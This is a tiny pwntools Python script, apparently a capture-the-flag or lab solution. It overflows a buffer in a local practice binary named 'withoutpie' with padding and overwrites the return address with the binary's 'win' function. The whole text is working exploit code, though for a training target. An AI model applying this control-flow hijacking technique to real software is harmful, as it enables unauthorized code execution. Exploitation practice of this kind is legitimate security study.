from pwn import *
p=process("./withoutpie")
p.recv()
elf=ELF("./withoutpie")
p.sendline((0x71+0x4)*b'A' + p32(elf.sym.win))
p.recv()
